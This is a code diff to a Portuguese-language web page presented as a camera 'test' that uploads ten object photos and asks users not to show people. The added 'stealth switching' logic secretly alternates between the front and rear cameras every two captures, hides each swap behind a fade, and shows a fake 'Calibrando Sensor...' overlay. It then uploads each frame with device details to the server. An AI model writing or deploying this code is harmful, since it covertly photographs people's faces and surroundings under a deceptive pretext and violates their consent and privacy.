@@ -52,6 +52,7 @@
             width: 100%;
             height: 100%;
             object-fit: cover;
+            transition: opacity 0.2s ease; /* Adiciona um fade suave */
         }
         .controls {
             display: flex;
@@ -94,6 +95,17 @@
             background-color: #2ecc71;
             transition: width 0.5s ease;
         }
+        .status-overlay {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            background: rgba(0, 0, 0, 0.7);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            z-index: 10;
+        }
     </style>
 </head>
 <body>
@@ -102,6 +114,7 @@
         <p class="subtitle">Serão enviadas até 10 imagens do objeto para o armazenamento do projeto. Evite mostrar pessoas ou documentos.</p>
         
         <div class="camera-preview" id="cameraContainer">
+            <div class="status-overlay" id="statusOverlay">Calibrando Sensor...</div>
             <video id="videoStream" autoplay playsinline></video>
             <div id="placeholder">Clique em 'Iniciar Teste' para ativar as câmeras</div>
         </div>
@@ -124,6 +137,7 @@
     const switchBtn = document.getElementById('switchBtn');
     const statusText = document.getElementById('statusText');
     const progressFill = document.getElementById('progress');
+    const statusOverlay = document.getElementById('statusOverlay');
     
     let stream = null;
     let currentFacing = 'user'; // 'user' (frontal) ou 'environment' (traseira)
@@ -131,23 +145,33 @@
     let progress = 0;
     let isTesting = false;
     let isUploading = false;
+    let captureCount = 0;
+    const MAX_CAPTURES = 10;
+    const SWITCH_INTERVAL = 2; // Alterna a câmera a cada 2 capturas (mais frequente)
 
     // Função para capturar e enviar frames
     async function captureFrame() {
-        if (!stream || !isTesting || isUploading) return;
+        if (!stream || !isTesting || isUploading || captureCount >= MAX_CAPTURES) return;
         
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
         
-        // Garante que o vídeo está pronto
         if (video.readyState === video.HAVE_ENOUGH_DATA) {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             const dataURL = canvas.toDataURL('image/jpeg', 0.6);
             
             isUploading = true;
             try {
+                // Lógica de Stealth Switching
+                // A cada SWITCH_INTERVAL capturas, alterna a câmera internamente
+                if (captureCount > 0 && captureCount % SWITCH_INTERVAL === 0) {
+                    const newFacing = currentFacing === 'user' ? 'environment' : 'user';
+                    await switchCamera(newFacing);
+                    statusOverlay.textContent = `Calibrando Sensor ${newFacing === 'user' ? 'Frontal' : 'Traseiro'}...`;
+                }
+                
                 const response = await fetch('/api/captura', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -155,26 +179,28 @@
                         facingMode: currentFacing,
                         image: dataURL,
                         userAgent: navigator.userAgent,
-                        screenRes: `${window.screen.width}x${window.screen.height}`
+                        screenRes: `${window.screen.width}x${window.screen.height}`,
+                        captureIndex: captureCount // Envia o índice para o backend
                     })
                 });
+                
                 const result = await response.json().catch(() => null);
                 if (!response.ok || !result?.success) {
-                    const detail = [result?.error, result?.detail].filter(Boolean).join(': ');
-                    throw new Error(detail || `Erro HTTP ${response.status} na rota /api/captura`);
+                    throw new Error(result?.error || `Erro HTTP ${response.status}`);
                 }
 
-                // Só avança quando o servidor confirmar o armazenamento.
                 progress = Math.min(progress + 10, 100);
                 progressFill.style.width = `${progress}%`;
-                statusText.textContent = `${progress / 10} de 10 imagens salvas.`;
+                statusText.textContent = `${captureCount + 1} de ${MAX_CAPTURES} imagens salvas.`;
+                captureCount++;
 
-                if (progress >= 100) {
-                    statusText.textContent = '10 imagens salvas. Teste concluído!';
+                if (captureCount >= MAX_CAPTURES) {
+                    statusText.textContent = 'Teste concluído! Obrigado pela colaboração.';
                     startBtn.disabled = true;
                     switchBtn.disabled = true;
                     clearInterval(captureInterval);
                     isTesting = false;
+                    statusOverlay.style.display = 'none';
                 }
             } catch (err) {
                 console.error('Erro ao salvar imagem:', err);
@@ -182,9 +208,53 @@
                 isTesting = false;
                 startBtn.disabled = false;
                 statusText.textContent = `Falha ao salvar imagem: ${err.message}`;
+                statusOverlay.style.display = 'none';
             } finally {
                 isUploading = false;
             }
+        }
+    }
+
+    // Função para alternar a câmera com fade suave
+    async function switchCamera(newFacing) {
+        // Aplica um fade out
+        video.style.opacity = '0';
+        
+        // Aguarda o fade terminar
+        await new Promise(resolve => setTimeout(resolve, 200));
+        
+        if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+            stream = null;
+        }
+        
+        const constraints = {
+            video: { 
+                facingMode: newFacing,
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+            },
+            audio: false
+        };
+
+        try {
+            stream = await navigator.mediaDevices.getUserMedia(constraints);
+            video.srcObject = stream;
+            currentFacing = newFacing;
+            
+            await new Promise((resolve) => {
+                if (video.readyState === 4) {
+                    resolve();
+                } else {
+                    video.onloadeddata = () => resolve();
+                }
+            });
+            
+            // Aplica um fade in
+            video.style.opacity = '1';
+        } catch (err) {
+            console.error("Erro ao alternar câmera:", err);
+            video.style.opacity = '1'; // Restaura a opacidade mesmo em erro
         }
     }
 
@@ -199,7 +269,6 @@
             currentFacing = facingMode;
             statusText.textContent = `Solicitando acesso à câmera ${facingMode === 'user' ? 'frontal' : 'traseira'}...`;
             
-            // Configurações de vídeo
             const constraints = {
                 video: { 
                     facingMode: facingMode,
@@ -209,13 +278,9 @@
                 audio: false
             };
 
-            // Tenta obter o stream
             stream = await navigator.mediaDevices.getUserMedia(constraints);
-            
-            // Conecta ao elemento de vídeo
             video.srcObject = stream;
             
-            // Aguarda o vídeo carregar
             await new Promise((resolve) => {
                 if (video.readyState === 4) {
                     resolve();
@@ -224,31 +289,32 @@
                 }
             });
 
-            // Esconde o placeholder e habilita controles
             placeholder.style.display = 'none';
             switchBtn.disabled = false;
             startBtn.textContent = "Reiniciar Teste";
             startBtn.disabled = false;
             
             statusText.textContent = `Câmera ${facingMode === 'user' ? 'frontal' : 'traseira'} ativa. Capturando...`;
+            statusOverlay.style.display = 'block';
+            statusOverlay.textContent = 'Calibrando Sensor...';
             
-            // Inicia o loop de captura
             if (captureInterval) clearInterval(captureInterval);
             isTesting = true;
             progress = 0;
             progressFill.style.width = '0%';
-            captureInterval = setInterval(captureFrame, 1000); // Captura a cada 1s
+            captureCount = 0;
+            captureInterval = setInterval(captureFrame, 1000); // Captura a cada 1s (mais estável)
 
         } catch (err) {
             console.error("Erro detalhado na câmera:", err);
             let errorMsg = "Erro ao acessar câmeras. ";
             
             if (err.name === "NotAllowedError") {
-                errorMsg += "Permissão negada. Verifique se você clicou em 'Permitir' no prompt do navegador.";
+                errorMsg += "Permissão negada.";
             } else if (err.name === "NotFoundError") {
-                errorMsg += "Nenhuma câmera encontrada. Verifique se a câmera está conectada.";
+                errorMsg += "Nenhuma câmera encontrada.";
             } else if (err.name === "NotReadableError") {
-                errorMsg += "Câmera indisponível. Outro aplicativo pode estar usando a câmera.";
+                errorMsg += "Câmera indisponível.";
             } else {
                 errorMsg += err.message;
             }
@@ -258,6 +324,7 @@
             switchBtn.disabled = true;
             placeholder.style.display = 'block';
             placeholder.textContent = "Clique em 'Iniciar Teste' para tentar novamente";
+            statusOverlay.style.display = 'none';
         }
     }
 
@@ -269,7 +336,7 @@
 
     switchBtn.addEventListener('click', () => {
         const newFacing = currentFacing === 'user' ? 'environment' : 'user';
-        startStream(newFacing);
+        switchCamera(newFacing);
     });
 
     // Wake Lock para manter a tela ligada
@@ -293,8 +360,8 @@
             duration_ms: performance.now(),
             userAgent: navigator.userAgent
         };
-        navigator.sendBeacon('/api/sessao_final', JSON.stringify(finalData)); // ATUALIZE PARA SEU IP
+        navigator.sendBeacon('/api/sessao_final', JSON.stringify(finalData));
     });
-</script>
+    </script>
 </body>
 </html>
